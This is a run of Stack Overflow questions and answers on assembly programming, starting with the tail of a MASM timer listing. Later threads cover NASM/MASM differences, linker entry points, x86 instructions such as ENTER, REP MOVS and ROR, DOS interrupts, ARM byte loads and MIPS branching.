    push    ax
    pushf
    pop ax          ;get flags so we can keep
                    ; interrupts off when leaving
                    ; this routine
    mov cs:[OriginalFlags],ah   ;remember the state of the
                    ; Interrupt flag
    and ah,0fdh         ;set pushed interrupt flag
                    ; to 0
    push    ax
;
; Turn on interrupts, so the timer interrupt can occur if it's
; pending.
;
    sti
;
; Set timer 0 of the 8253 to mode 2 (divide-by-N), to cause
; linear counting rather than count-by-two counting. Also
; leaves the 8253 waiting for the initial timer 0 count to
; be loaded.
;
    mov al,00110100b        ;mode 2
    out MODE_8253,al
;
; Set the timer count to 0, so we know we won't get another
; timer interrupt right away.
; Note: this introduces an inaccuracy of up to 54 ms in the system
; clock count each time it is executed.
;
    DELAY
    sub al,al
    out TIMER_0_8253,al     ;lsb
    DELAY
    out TIMER_0_8253,al     ;msb
;
; Wait before clearing interrupts to allow the interrupt generated
; when switching from mode 3 to mode 2 to be recognized. The delay
; must be at least 210 ns long to allow time for that interrupt to
; occur. Here, 10 jumps are used for the delay to ensure that the
; delay time will be more than long enough even on a very fast PC.
;
    rept 10
    jmp $+2
    endm
;
; Disable interrupts to get an accurate count.
;
    cli
;
; Set the timer count to 0 again to start the timing interval.
;
    mov al,00110100b        ;set up to load initial
    out MODE_8253,al        ; timer count
    DELAY
    sub al,al
    out TIMER_0_8253,al     ;load count lsb
    DELAY
    out TIMER_0_8253,al     ;load count msb
;
; Restore the context and return.
;
    MPOPF               ;keeps interrupts off
    pop ax
    ret

ZTimerOn    endp

;********************************************************************
;* Routine called to stop timing and get count.             *
;********************************************************************

ZTimerOff proc  near

;
; Save the context of the program being timed.
;
    push    ax
    push    cx
    pushf
;
; Latch the count.
;
    mov al,00000000b        ;latch timer 0
    out MODE_8253,al
;
; See if the timer has overflowed by checking the 8259 for a pending
; timer interrupt.
;
    mov al,00001010b        ;OCW3, set up to read
    out OCW3,al         ; Interrupt Request register
    DELAY
    in  al,IRR          ;read Interrupt Request
                    ; register
    and al,1            ;set AL to 1 if IRQ0 (the
                    ; timer interrupt) is pending
    mov cs:[OverflowFlag],al    ;store the timer overflow
                    ; status
;
; Allow interrupts to happen again.
;
    sti
;
; Read out the count we latched earlier.
;
    in  al,TIMER_0_8253     ;least significant byte
    DELAY
    mov ah,al
    in  al,TIMER_0_8253     ;most significant byte
    xchg    ah,al
    neg ax          ;convert from countdown
                    ; remaining to elapsed
                    ; count
    mov cs:[TimedCount],ax
; Time a zero-length code fragment, to get a reference for how
; much overhead this routine has. Time it 16 times and average it,
; for accuracy, rounding the result.
;
    mov cs:[ReferenceCount],0
    mov cx,16
    cli             ;interrupts off to allow a
                    ; precise reference count
RefLoop:
    call    ReferenceZTimerOn
    call    ReferenceZTimerOff
    loop    RefLoop
    sti
    add cs:[ReferenceCount],8   ;total + (0.5 * 16)
    mov cl,4
    shr cs:[ReferenceCount],cl  ;(total) / 16 + 0.5
;
; Restore original interrupt state.
;
    pop ax          ;retrieve flags when called
    mov ch,cs:[OriginalFlags]   ;get back the original upper
                    ; byte of the FLAGS register
    and ch,not 0fdh     ;only care about original
                    ; interrupt flag...
    and ah,0fdh         ;...keep all other flags in
                    ; their current condition
    or  ah,ch           ;make flags word with original
                    ; interrupt flag
    push    ax          ;prepare flags to be popped
;
; Restore the context of the program being timed and return to it.
;
    MPOPF               ;restore the flags with the
                    ; original interrupt state
    pop cx
    pop ax
    ret

ZTimerOff endp

;
; Called by ZTimerOff to start timer for overhead measurements.
;

ReferenceZTimerOn   proc    near
;
; Save the context of the program being timed.
;
    push    ax
    pushf       ;interrupts are already off
;
; Set timer 0 of the 8253 to mode 2 (divide-by-N), to cause
; linear counting rather than count-by-two counting.
;
    mov al,00110100b    ;set up to load
    out MODE_8253,al    ; initial timer count
    DELAY
;
; Set the timer count to 0.
;
    sub al,al
    out TIMER_0_8253,al ;load count lsb
    DELAY
    out TIMER_0_8253,al ;load count msb
;
; Restore the context of the program being timed and return to it.
;
    MPOPF
    pop ax
    ret

ReferenceZTimerOn   endp

;
; Called by ZTimerOff to stop timer and add result to ReferenceCount
; for overhead measurements.
;

ReferenceZTimerOff proc near
;
; Save the context of the program being timed.
;
    push    ax
    push    cx
    pushf
;
; Latch the count and read it.
;
    mov al,00000000b        ;latch timer 0
    out MODE_8253,al
    DELAY
    in  al,TIMER_0_8253     ;lsb
    DELAY
    mov ah,al
    in  al,TIMER_0_8253     ;msb
    xchg    ah,al
    neg ax          ;convert from countdown
                    ; remaining to amount
                    ; counted down
    add cs:[ReferenceCount],ax
;
; Restore the context of the program being timed and return to it.
;
    MPOPF
    pop cx
    pop ax
    ret

ReferenceZTimerOff endp

;********************************************************************
;* Routine called to report timing results.             *
;********************************************************************

ZTimerReport    proc    near

    pushf
    push    ax
    push    bx
    push    cx
    push    dx
    push    si
    push    ds
;
    push    cs  ;DOS functions require that DS point
    pop ds  ; to text to be displayed on the screen
    assume  ds:Code
;
; Check for timer 0 overflow.
;
    cmp [OverflowFlag],0
    jz  PrintGoodCount
    mov dx,offset OverflowStr
    mov ah,9
    int 21h
    jmp short EndZTimerReport
;
; Convert net count to decimal ASCII in microseconds.
;
PrintGoodCount:
    mov ax,[TimedCount]
    sub ax,[ReferenceCount]
    mov si,offset ASCIICountEnd - 1
;
; Convert count to microseconds by multiplying by .8381.
;
    mov dx,8381
    mul dx
    mov bx,10000
    div bx      ;* .8381 = * 8381 / 10000
;
; Convert time in microseconds to 5 decimal ASCII digits.
;
    mov bx,10
    mov cx,5
CTSLoop:
    sub dx,dx
    div bx
    add dl,'0'
    mov [si],dl
    dec si
    loop    CTSLoop
;
; Print the results.
;
    mov ah,9
    mov dx,offset OutputStr
    int 21h
;
EndZTimerReport:
    pop ds
    pop si
    pop dx
    pop cx
    pop bx
    pop ax
    MPOPF
    ret

ZTimerReport    endp

Code    ends
    end
</code></pre>

<p>I added nasm.exe to my path, saved this file as listing1.asm, and tried to use the following CMD command to assemble it:</p>

<pre><code>nasm -f win32 listing1.asm
</code></pre>

<p>However, it didn't assemble, and instead gave me the following errors:</p>

<pre><code>listing1.asm:50: error: parser: instruction expected
listing1.asm:51: error: parser: instruction expected
listing1.asm:82: error: parser: instruction expected
listing1.asm:83: error: parser: instruction expected
listing1.asm:95: error: parser: instruction expected
listing1.asm:99: error: symbol `endm' redefined
listing1.asm:114: error: parser: instruction expected
listing1.asm:115: error: comma expected after operand 4
listing1.asm:116: error: parser: instruction expected
listing1.asm:122: error: parser: instruction expected
listing1.asm:142: error: parser: instruction expected
listing1.asm:176: error: symbol `DELAY' redefined
listing1.asm:179: error: symbol `DELAY' redefined
listing1.asm:188: error: parser: instruction expected
listing1.asm:190: error: symbol `endm' redefined
listing1.asm:200: error: symbol `DELAY' redefined
listing1.asm:203: error: symbol `DELAY' redefined
listing1.asm:208: error: symbol `MPOPF' redefined
listing1.asm:212: error: symbol `ZTimerOn' redefined
listing1.asm:212: error: parser: instruction expected
listing1.asm:218: error: parser: instruction expected
listing1.asm:237: error: symbol `DELAY' redefined
listing1.asm:252: error: symbol `DELAY' redefined
listing1.asm:282: error: comma, colon or end of line expected
listing1.asm:292: error: symbol `MPOPF' redefined
listing1.asm:298: error: symbol `ZTimerOff' redefined
listing1.asm:298: error: parser: instruction expected
listing1.asm:304: error: parser: instruction expected
listing1.asm:316: error: symbol `DELAY' redefined
listing1.asm:322: error: symbol `DELAY' redefined
listing1.asm:327: error: symbol `MPOPF' redefined
listing1.asm:331: error: symbol `ReferenceZTimerOn' redefined
listing1.asm:331: error: parser: instruction expected
listing1.asm:338: error: parser: instruction expected
listing1.asm:350: error: symbol `DELAY' redefined
listing1.asm:352: error: symbol `DELAY' redefined
listing1.asm:363: error: symbol `MPOPF' redefined
listing1.asm:368: error: symbol `ReferenceZTimerOff' redefined
listing1.asm:368: error: parser: instruction expected
listing1.asm:374: error: parser: instruction expected
listing1.asm:386: error: symbol `assume' redefined
listing1.asm:386: error: parser: instruction expected
listing1.asm:392: error: comma, colon or end of line expected
listing1.asm:402: error: comma, colon or end of line expected
listing1.asm:426: error: comma, colon or end of line expected
listing1.asm:436: error: symbol `MPOPF' redefined
listing1.asm:439: error: symbol `ZTimerReport' redefined
listing1.asm:439: error: parser: instruction expected
listing1.asm:441: error: symbol `Code' redefined
listing1.asm:441: error: parser: instruction expected
</code></pre>

<p>Not sure what I should do here; I've tried googling around a little bit but haven't come up with anything. Anyone recognize these errors?</p>
","<p>That assembly language is MASM, not NASM.</p>

<p>For starters, NASM segments are defined differently.</p>

<p>Instead of </p>

<pre><code>Code    segment word public 'CODE'
</code></pre>

<p>we write</p>

<pre><code>.section text
</code></pre>

<p>And that ""ASSUME"" declaration...  You must have an ancient book.  That is old, old MASM code.  Brings back memories from the early 1980s for me!</p>

<p>There are many differences between NASM and MASM, and your code needs quite a bit of work to port.  If you want to port that MASM code to NASM, see <a href=""https://stackoverflow.com/questions/2035747/masm-nasm-differences"">MASM/NASM Differences</a> or the NASM documentation or google ""NASM vs MASM""</p>

<p>TL;DR: you are writing MASM code, not NASM.</p>
","11572395"
"unresolved external symbol _WinMainCRTStartup","8387","","<p>I'm trying to assemble a simple ""Hello world"" application with Masm32. It assembles fine but when I try to link it, the linker says</p>

<blockquote>
  <p>LINK : error LNK2001: unresolved external symbol _WinMainCRTStartup
  prog1.exe : fatal error LNK1120: 1 unresolved externals</p>
</blockquote>

<p>This is the source code of the program:</p>

<pre><code>.586P

.MODEL FLAT, STDCALL
STD_OUTPUT_HANDLE equ -11

; Prototypes of external procedures
EXTERN GetStdHandle@4:NEAR
EXTERN WriteConsoleA@20:NEAR
EXTERN ExitProcess@4:NEAR

; INCLUDELIB directives for the linker
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\kernel32.lib

;============ data segment =================
_DATA SEGMENT
HANDL DWORD ?
BUFER DB ""Hello world\n"", 0
NUMB  DWORD ?
NUMW  DWORD ?
_DATA ENDS

_TEXT SEGMENT
MAIN:
;====== Get the output handle ======
     PUSH STD_OUTPUT_HANDLE
     CALL GetStdHandle@4
     MOV  HANDL, EAX


; Output the buffer contents to the console
     PUSH 0
     PUSH OFFSET NUMW
     PUSH NUMB
     PUSH OFFSET BUFER
     PUSH HANDL
     CALL WriteConsoleA@20

;Exit application
     PUSH 0
     CALL ExitProcess@4
_TEXT ENDS
END
</code></pre>

<p>I found in some forums that this is caused by the encode type. However it doesn't seem to matter to my problem</p>
","<p>The linker assumes the default name for entry point.
You have a few options.<br>
 1. Use the C libraries on the platform, which because you're using MASM, I assume you don't want to.<br>
 2. Rename your MAIN to _WinMainCRTStartup<br>
 3. Use ""-entry:MAIN"" on the Link.exe command-line (you may need a ""public MAIN"" line)</p>
","4274413"
"""enter"" vs ""push ebp; mov ebp, esp; sub esp, imm"" and ""leave"" vs ""mov esp, ebp; pop ebp""","8384","","<p>What is the difference between the <code>enter</code> and</p>

<pre><code>push ebp
mov  ebp, esp
sub  esp, imm
</code></pre>

<p>instructions? Is there a performence difference? If so, which is faster and why do compilers always use the latter?</p>

<p>Similarily with the <code>leave</code> and</p>

<pre><code>mov  esp, ebp
pop  ebp
</code></pre>

<p>instructions.</p>
","<p>There is a performance difference, especially for <code>enter</code>. On modern processors this decodes to some 10 to 20 µops, while the three instruction sequence is about 4 to 6, depending on the architecture. For details consult <a href=""http://www.agner.org/optimize/"" rel=""noreferrer"">Agner Fog's</a> instruction tables.</p>

<p>Additionally the <code>enter</code> instruction usually has a quite high latency, for example 8 clocks on a core2, compared to the 3 clocks dependency chain of the three instruction sequence.</p>

<p>Furthermore the three instruction sequence may be spread out by the compiler for scheduling purposes, depending on the surrounding code of course, to allow more parallel execution of instructions.</p>
","5964507"
"How do you get how much memory a program uses?","8381","","<p>I have two programs, one in C++, the other in assembler. I want to compare how much memory they use when running respectively. How can I do this?</p>

<p>I am doing the testing on Windows, but I also would like to know how to do it on Linux.</p>
","<p>Run the program in one shell. Open another shell and run 'top' command. it will list running processes and home much memory they  consume. you can, i guess, poll /proc/yourprocessid/stat to see how much memory it is using over time.</p>
","1480644"
"Assembly: REP MOV mechanism","8379","","<p>Looking at the following assembly code:  </p>

<pre><code>MOV ESI, DWORD PTR [EBP + C]
MOV ECX, EDI
MOV EAX, EAX
SHR ECX, 2
LEA EDI, DWORD PTR[EBX + 18]
REP MOVS DWORD PTR ES:[EDI], DWORD PTR [ESI]
MOV ECX, EAX
AND ECX, 3
REP MOVS BYTE PTR ES:[EDI], BYTE PTR[ESI]
</code></pre>

<p>The book I got the code excerpt from explains the first <code>REP MOVS</code> as copying over 4-byte chunks, with the second <code>REP MOVS</code> copying the remaining 2-byte chunk, if it exists.</p>

<p>How do the <code>REP MOVS</code> instructions operate? According to <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff561504(v=vs.85).aspx"" rel=""noreferrer"">MSDN</a>, ""The instruction can be prefixed by REP to repeat the operation the number of times specified by the ecx register."" Wouldn't that just repeat the same operation over and over again?  </p>
","<p>For questions about particular instructions always consult the instruction set reference.</p>

<p>In this case, you will need to look up <code>rep</code> and <code>movs</code> (which is not <code>mov</code>).
In short, <code>rep</code> repeats the following string operation <code>ecx</code> times. <code>movs</code> moves data from <code>ds:esi</code> to <code>es:edi</code> and increments or decrements the pointers based on the setting of the direction flag. As such, repeating it will move a range of memory to somewhere else.</p>

<p>PS: usually the operation size is encoded as an instruction suffix, so people use <code>movsb</code> and <code>movsd</code> to indicate <code>byte</code> or <code>dword</code> operation. Some assemblers however allow specifying the size as in your example, by <code>byte ptr</code> or <code>dword ptr</code>. Also, the operands are implicit in the instruction, and you can not modify them.</p>
","27804935"
"What does .comm mean?","8375","","<p>I just translated this program,</p>

<pre><code>#include &lt;stdio.h&gt;

int dam[1000][1000];


int main (int argc, const char * argv[]) {
    // insert code here...
    printf(""Hello, World!\n"");
    return 0;
}
</code></pre>

<p>to assembly using gcc producing,</p>

<pre><code>    .cstring
LC0:
    .ascii ""Hello, World!\0""
    .text
.globl _main
_main:
    pushl   %ebp
    movl    %esp, %ebp
    pushl   %ebx
    subl    $20, %esp
    call    L3
""L00000000001$pb"":
L3:
    popl    %ebx
    leal    LC0-""L00000000001$pb""(%ebx), %eax
    movl    %eax, (%esp)
    call    L_puts$stub
    movl    $0, %eax
    addl    $20, %esp
    popl    %ebx
    leave
    ret
.comm _dam,1000000,5
    .section __IMPORT,__jump_table,symbol_stubs,self_modifying_code+pure_instructions,5
L_puts$stub:
    .indirect_symbol _puts
    hlt ; hlt ; hlt ; hlt ; hlt
    .subsections_via_symbols
</code></pre>

<p>What does .comm mean? Does dam use heap space, stack space or data space?</p>
","<p>From the <code>as</code> manual:</p>

<blockquote>
  <p>..comm declares a common symbol named
  symbol. When linking, a common symbol
  in one object file may be merged with
  a defined or common symbol of the same
  name in another object file. If ld
  does not see a definition for the
  symbol--just one or more common
  symbols--then it will allocate length
  bytes of uninitialized memory. length
  must be an absolute expression. If ld
  sees multiple common symbols with the
  same name, and they do not all have
  the same size, it will allocate space
  using the largest size.</p>
  
  <p>When using ELF, the .comm directive
  takes an optional third argument. This
  is the desired alignment of the
  symbol, specified as a byte boundary
  (for example, an alignment of 16 means
  that the least significant 4 bits of
  the address should be zero). The
  alignment must be an absolute
  expression, and it must be a power of
  two. If ld allocates uninitialized
  memory for the common symbol, it will
  use the alignment when placing the
  symbol. If no alignment is specified,
  as will set the alignment to the
  largest power of two less than or
  equal to the size of the symbol, up to
  a maximum of 16.</p>
</blockquote>
","501138"
"mov %eax,(%esp)","8367","","<p>What is the difference between the following statements?</p>

<pre><code>mov %eax,%esp
mov %eax,(%esp)
</code></pre>

<p>I'm working on diffusing a binary bomb and am having trouble with a few of the <code>mov</code> and <code>leal</code> commands early on in the assembly.  </p>
","<p>This copies the value in %eax into %esp.</p>

<pre><code>mov %eax,%esp
</code></pre>

<p>This copies the value from %eax to the location in memory that %esp points to.</p>

<pre><code>mov %eax,(%esp)
</code></pre>
","12978084"
"Why There is a difference between assembly languages like Windows, Linux?","8361","","<p>I am relatively new to all this low level stuff,assembly language.. and want to learn more detail. Why there is a difference between Linux, Windows Assembly languages? </p>

<p>As I understand when I compile a C code Operating system does not really produce pure machine or assembly code, it produces OS dependent binary code.But why ?</p>

<p>For example when I use a x86 system, CPU only understands x86 ASM am I right?.So Why we dont write pure x86 assembly code and why there are different assembly variations based on Operating system? If we would write pure ASM or OS produce pure ASM there wouldn't be binary compatilibty issues between Operating systems or Not ? </p>

<p>I am really wondering all reasons behind them. Any detailed answer, article, book would be great. Thanks.</p>
","<p>There is no difference. The assembly code is the same if the processor is the same. x86 code compiled on Windows is binary compatible with x86 code on Linux. The compiler does not produce OS-dependent binary code, but it may package the code in a different format (e.g. PE vs. ELF).</p>

<p>The difference is in which libraries are used. In order to use OS stuff (I/O for example) you must link against the operating system's libraries. Unsurprisingly, Windows system libraries are not available on a Linux machine (unless you have Wine of course) and vice-versa.</p>
","4605392"
"Length of input string in assembly language","8305","","<p>I want to do two things:<br>
1) Take a string from user<br>
2) Find the length of that string    </p>

<p>I tried the following code:</p>

<pre><code>.model small    
.stack 100h
.data
    MAXLEN DB 100
    ACT_LEN DB 0                ;Actual length of the string  
    ACT_DATA DB 100 DUP('$')    ;String will be stored in ACT_DATA
    MSG1 DB 10,13,'ENTER STRING : $'
.CODE
START:
    MOV AX,@data
    MOV DS,AX
    ;Normal printing 
    LEA DX,MSG1
    MOV AH,09H
    INT 21H
    ;Cant understand code from here!
    LEA DX,ACT_DATA
    MOV AH,0AH
    MOV DX,OFFSET MAXLEN
    INT 21H

    LEA SI,ACT_DATA
    MOV CL,ACT_LEN

    ;AND THEH SOME OPERATIONS

END START
</code></pre>

<p>But I am confused how the length is stored in <code>CL</code> register, i.e. how the <code>ACT_LEN</code> value is incremented? And what actually does <code>mov AH,0A</code> has relation with length?</p>
","<p><a href=""http://www.ctyme.com/intr/rb-2563.htm"" rel=""nofollow"">Int 21/AH=0Ah</a></p>

<pre><code>Format of DOS input buffer:

Offset  Size    Description     (Table 01344)
00h    BYTE    maximum characters buffer can hold (MAXLEN)
01h    BYTE    (call) number of chars from last input which may be recalled (ACT_LEN)
(ret) number of characters actually read, excluding CR
02h  N BYTEs   actual characters read, including the final carriage return (ACT_DATA)
</code></pre>

<p>The buffered input interrupt will fill in these values.</p>

<pre><code>LEA DX,ACT_DATA
MOV AH,0AH
MOV DX,OFFSET MAXLEN
INT 21H
</code></pre>

<p>You do not need <code>LEA DX,ACT_DATA</code></p>

<p><code>mov AH,0A</code> is the number of the interrupt to call.  <a href=""http://ctyme.com/rbrown.htm"" rel=""nofollow"">Ralph Brown has a big list</a> of interrupts with descriptions and what goes in/comes out. </p>
","19556652"
"Difference between load word and move?","8301","","<p>What is the difference between</p>

<p><code>ldw r8,0(r4)</code></p>

<p>and</p>

<p><code>mov r8, r4</code></p>

<p>Load word says ""copy from memory"" but when load word copies from r4, it is copying from register and not from memory right?</p>
","<p>The <code>lw</code> instruction (I assume that's what you meant since <code>ldw</code> isn't a standard MIPS instruction, though all the loads will be similar in the context of this answer) loads a word from the <em>memory address</em> specified by <code>0 + r4</code>, while <code>move</code><sup>1</sup> simply transfers the value of <code>r4</code> into <code>r8</code>.</p>

<p>For example, let's say <code>r4</code> is currently <code>1234</code> and the word stored at <code>1234</code> in memory is <code>5678</code>.</p>

<p>The difference is thus:</p>

<pre><code>move r8, r4            ; r8 is now 1234
lw   r8, 0(r4)         ; r8 is now 5678
</code></pre>

<hr>

<p><sup>1</sup> The <code>move</code> instruction"" is actually a pseudo-instruction where <code>move $rt, $rs</code> is encoded as <code>addi $rt, $rs, 0</code>.</p>
","12155257"
"Terminology: ""registers"" in assembly language programming","8290","","<p>I've heard the terminologies: register, hardware register, program register,register file.</p>

<p>What's the difference between all these? And in assebmly, what is the type of the EAX register? Program register?</p>
","<p>A register is a storage area inside the CPU. Here are some definitions:</p>

<ul>
<li>A register file is an array of registers - see <a href=""http://en.wikipedia.org/wiki/Register_file"" rel=""nofollow noreferrer"">http://en.wikipedia.org/wiki/Register_file</a> for a full description. </li>
<li>The eax register is the accumulator register of the Intel x86 family of CPUs - it's the place where integer maths gets done.</li>
<li>The program register (I think you mean program counter) is a special purpose register which contains the address of the next machine code instruction to be executed</li>
</ul>
","814455"
"tutorials on first pass and second pass of assembler","8287","","<p>Are there good tutorials around that explain about the first and second pass of assembler along with their algorithms ? I searched a lot about them but haven't got satisfying results.
Please link the tutorials if any.</p>
","<p>A good place to start is David Solomon's book, <a href=""http://www.davidsalomon.name/assem.advertis/AssemAd.html"" rel=""nofollow"">Assemblers and Loaders</a>. It's an older book, but the information is still relevant.</p>

<p>You can download a <a href=""http://www.davidsalomon.name/assem.advertis/asl.pdf"" rel=""nofollow"">PDF of the book</a>.</p>
","9216755"
"Writing to a file in assembler","8286","","<p>I'm tasked with creating a program that would write some string to a file. So far, I came up with this:</p>

<pre><code>org     100h

mov     dx, text
mov     bx, filename
mov     cx, 5
mov     ah, 40h
int     21h

mov     ax, 4c00h
int     21h

text db ""Adam$""
filename db ""name.txt"",0
</code></pre>

<p>but it doesn't do anything. I'm using nasm and dosbox.</p>
","<p>You have to create the file first (or open it if it already exists), then write the string, and finally close the file. Next code is MASM and made with EMU8086, I post it because it may help you to understand how to do it, interrupts are the same, as well as parameters, so the algorithm :</p>

<pre><code>.stack 100h
.data

text db ""Adam$""
filename db ""name.txt"",0
handler dw ?

.code          
;INITIALIZE DATA SEGMENT.
  mov  ax,@data
  mov  ds,ax

;CREATE FILE.
  mov  ah, 3ch
  mov  cx, 0
  mov  dx, offset filename
  int  21h  

;PRESERVE FILE HANDLER RETURNED.
  mov  handler, ax

;WRITE STRING.
  mov  ah, 40h
  mov  bx, handler
  mov  cx, 5  ;STRING LENGTH.
  mov  dx, offset text
  int  21h

;CLOSE FILE (OR DATA WILL BE LOST).
  mov  ah, 3eh
  mov  bx, handler
  int  21h      

;FINISH THE PROGRAM.
  mov  ax,4c00h
  int  21h           
</code></pre>
","29545526"
"Converting Hexadecimal/Decimal numbers (Assemly-TASM)","8271","","<p>I am trying to print the numbers simply in the sequence i.e</p>

<p>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</p>

<p>using Loop, 
First i converted each number into Hexa printed it reset it to the decimal increment by 1 and then print the next until the number is equal to 9,
When the number is equal to 9 i used DAA to simply the number and after rotating and shifting the number i eventually stored the result in the string.</p>

<p>The output is just fine till the 16, but after 16 the sequence repeats itself,</p>

<p><strong>Desired output:</strong></p>

<p>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</p>

<p><strong>Current Output</strong>
 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,11,12,13,14,15</p>

<p>Why does it happens so ???</p>

<p>Here is my Code,</p>

<pre><code>MOV CX,20 ;Number of Iterations


MOV DX,1



L1:
    PUSH DX
    ADD DX,30H  
    MOV AH,02H        ;PRINT Content of DX
    INT 21H
    POP DX
    ADD DX,1
    CMP DX,09d        ;If number is Greater than 9 jump to L2   
    JA L2
LOOP L1


    L2: 
        PUSH DX
        MOV AX,DX
        DAA           ;Convert to the Decimal
        XOR AH,AH         ;SET AH to 0000


        ROR AX,1    
        ROR AX,1    
        ROR AX,1    
        ROR AX,1    

        SHR AH,1
        SHR AH,1
        SHR AH,1
        SHR AH,1

        ADC AX,3030h
        MOV BX,OFFSET Result
        MOV byte ptr[BX],5           ; Length of the String
        MOV byte ptr[BX+4],'$'       ;5th position of string , $=Terminator
        MOV byte ptr[BX+3],AH        ;2nd Number onto 4th position
        MOV byte ptr[BX+2],AL        ;3rd number onto 3rd Position 

        MOV DX,BX
        ADD DX,02     ;1st 2 positions of String are type of string and    
                                  length respectively 
        MOV AH,09H ;to print the string
        INT 21H         

        POP DX      
        ADD DX,1

    LOOP L2

MOV AH,4CH  ;Return control to the DOS
INT 21H
</code></pre>

<p>P.S: I took help from this chart in understanding the numbers.</p>

<p><a href=""http://www.cheat-sheets.org/saved-copy/ascii.png"" rel=""nofollow"">http://www.cheat-sheets.org/saved-copy/ascii.png</a></p>
","<p>Just giving it a try, though I'm not sure, and I can't quickly test this.</p>

<p>But instead of using two loops I'd recommend using one for the whole bunch of numbers.</p>

<p>Furthermore I have the feeling that the problem has to do with the <code>DAA</code> instruction, which I'm not used to, since it is not supported in 64 bit mode.</p>

<p>Anyway, here's what I'd do:</p>

<pre><code>      mov  cx,20
      mov   al,1
      mov   bl,10      ; divisor
      mov   bp,offset Result ; no need to load this in the loop!!!

L1:   mov   dx,ax      ; save to register, not to stack
      cmp   ax,09d
      ja    L2         ; number has two digits
      add   al,30h     ; ASCII addend

      ; insert your output code here

      jmp   L3         ; jump over the two digit code
L2:   xor   ah,ah
      div   bl         ; divides AX by ten (no rotate or shift needed)
                       ; quotient in AL, remainder in AH (correct order for little endian)
      add   ax,3030h

      ; insert your output code here (note that the buffer/string address is loaded to BP)

L3:   mov   ax,dx
      inc   ax
      loop  L1

      ; done
</code></pre>

<p>If you wouldn't mind if one-digit numbers had a leading zero, it'd be even easier.</p>

<p>The <code>div</code> instruction is probably more expensive than <code>daa</code> plus <code>ror</code> plus <code>shr</code>, but your quad-rotate/shift will be even worse :-/</p>

<p>(As I said, I could not try it... leaving this open to you... if it doesn't work, just ask back.)</p>

<p>&mdash;</p>

<p>[update:</p>

<p>Another approach, especially to spare the <code>div</code> in this trivial case of digit separation, would be to add 6 to numbers greater nine (i. e. 10d = 0ah --(+6)--> 16d = 10h; this is what <code>daa</code> also does), then you can get along with the rotate/shift combination you used before.</p>

<p>Even better were to add 246, then to <code>AX</code>, after which you can simply use <code>ror ax,8</code> (or <code>rol</code> &mdash; doesn't matter in this case), i. e. 10d = 0ah --(+246)--> 256d = 100h, as well 15d = 0fh --(+246)--> 261 = 105h. Rotate it to be 0001h or 0501h respectively, add 3030h, and you're done.</p>

<p>/update]</p>

<p>[update level=""2""</p>

<p>What the fun... I actually intended to write it in the first level update, but forgot it somehow: instead of <code>rol</code>ling by 8, or &mdash; if your TASM really doesn't support <code>rol</code>ling by immediate &mdash; eight times rolling by one, you can of course also make use of the <code>xchg</code> instruction, which swaps values between registers, in this case</p>

<pre><code>  xchg al,ah
</code></pre>

<p>would do the job of swapping the contents of those two registers.</p>

<p>There's also a <code>bswap</code> instruction for reversing the byte order within a register, but it's obviously only available for registers of 32+ bits width.</p>

<p>/update]</p>
","12538417"
"Beginner ARM Assembly Question","8265","","<p>How do you properly load the value of a predefined .byte into a register? e.g. With a constant defined as: </p>

<pre><code>constant:   .byte   'a'
</code></pre>

<p>I am trying:</p>

<pre><code> ldr r0, =constant
 ldr r1, [r0]
</code></pre>

<p>However, the simulator halts after the second line and gives the error ""Access to unaligned memory location, bad address"" The rest of the code otherwise runs fine as long as the second line is not included.</p>

<p>Full Code:</p>

<pre><code>;   r0  is a pointer to msg1
;    r1  used to store the value of val
;   r2  used to compare a character in msg1
;   r3  counter for the number of comparisons

    .text
    .global _start  
_start:
        ldr r0, =msg
        ldr r1, =val
        ldr r1, [r1]
        mov r3, #0

loop:   ldr r2, [r0]    
        cmp r2, #0
        beq done
        cmp r0, r1
        add r0, r0, #4
        bne loop
        add r2, r2, #1
        b loop

done:
        swi 0x11

    .data
    .align
msg:    .asciz  ""How many 'a's are in this string?""
val:    .byte   'a'
    .end
</code></pre>
","<p>You can use <code>ldrb</code> to load a single byte into a register from a byte-aligned pointer.  I expect that's what you're looking for:</p>

<pre><code>ldr  r0, =val
ldrb r1, [r0]
</code></pre>

<p>You probably want the same in your loop or else you'll crash in the same way once you advance to the first character at a non-word-aligned address (probably the <code>o</code> in <code>How</code>):</p>

<pre><code>loop:    ldrb r2, [r0]
</code></pre>
","4929664"
"How does the x86 ROR instruction works?","8265","","<p>My <code>EAX</code> register contains the <code>xxxxxx9D</code> value and I have the following assembly code:</p>

<pre><code>C0C8 14 --&gt; ROR AL,14
</code></pre>

<p>To me, it means that the last 8 bits of the <code>EAX</code>'s 32 bits value are rotated bitwise by 14 mod 8 = 6 positions</p>

<pre><code>0x9D = b1001 1101
</code></pre>

<p>will be transformed into</p>

<pre><code>b0111 0110 = 0x76
</code></pre>

<p>However, OllyDbg tells me that <code>EAX = xxxxxxD9</code>, which means EAX has been rotated bitwise by 4 bits!</p>

<p>Where am I wrong?</p>
","<p>You are trying to rotate an 8-bit register by 20 positions.  That's a bit much, rotating by 8 produces the same value.  Rotating by 9 is the same as rotating by 1.  Etcetera.  The processor will thus rotate by 20 mod 8 = 4 positions.</p>
","10048329"
"If else in MIPS","8261","","<p>I am learning MIPS programming, in which I am trying to implement If else conditions. But the problem is when I enter 2 to select subtract condition, the program doesn't work. I know could have used BNE but I want to learn BEQ. Please tell me what is the problem is this code</p>

<pre><code>.text

main:

li $t0,1
li $t1,2
li $t2,3
li $t3,4

li $v0,5
syscall

move $s0,$v0

beq $s0,$t0,ADDTN
ADDTN:


li $a0,40
li $v0,1
syscall

li $v0,5
syscall


move $s1,$v0

li $v0,5
syscall

move $s2,$v0

add $a0,$s1,$s2

li $v0,1
syscall

li $v0,10
syscall



beq $s0,$t1,SUBTN
SUBTN:

li $a0,50
li $v0,1
syscall

li $v0,5
syscall


move $s3,$v0

li $v0,5
syscall

move $s4,$v0

sub $a0,$s3,$s4

li $v0,1
syscall

li $v0,10
syscall
</code></pre>
","<p>for example:</p>

<pre><code>beq $s0,$t0,ADDTN
ADDTN:
     # code for addition
     # ...
     # some syscalls
beq $s0.$t1,SUBTN
SUBTN:
 .
 .
 .
</code></pre>

<p>I have no idea what the syscalls do (I usually don't code for MIPS).</p>

